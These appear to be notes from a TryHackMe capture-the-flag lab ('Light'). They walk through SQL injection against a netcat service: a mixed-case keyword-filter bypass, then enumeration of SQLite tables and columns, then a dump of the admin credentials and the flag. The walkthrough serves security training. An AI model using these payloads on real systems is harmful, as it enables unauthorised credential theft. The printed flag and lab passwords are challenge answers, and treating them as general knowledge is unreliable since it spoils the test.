---
tags:
  - THM
  - Easy
  - Challenge
  - SQLi
---
https://tryhackme.com/room/lightroom/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.251.254 light.thm
```
# Scanning
We are told that an application is running on **port 1337** and that we can connect to it using Netcat and `smokey` as username.
# Discovery
The application returns the password for a given user:
```console
$ nc light.thm 1337

Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```
The application is running SQL and is vulnerable to injections:
```console
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```
We can assume that the query looks something like:
```sql
SELECT password FROM users WHERE username='<INPUT>';
```
# Exploitation
Words like `UNION`, `SELECT` and `FROM` are being filtered:
```console
Please enter your username: ' UNION SELECT 1
Ahh there is a word in there I don't like :(
```
After testing more payloads, we know that we are facing an SQLite3 application:
```console
Please enter your username: ' Union Select sqlite_version()'
Password: 3.31.1
```
List the tables:
```console
Please enter your username: ' Union Select group_concat(tbl_name) From sqlite_master'
Password: usertable,admintable
```
List the columns in the **admin table**:
```console
Please enter your username: ' Union Select group_concat(name) From pragma_table_info('admintable')'
Password: id,username,password
```
List the values and get the **flag**:
```console
Please enter your username: ' Union Select group_concat(username || ':' || password) From admintable'
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```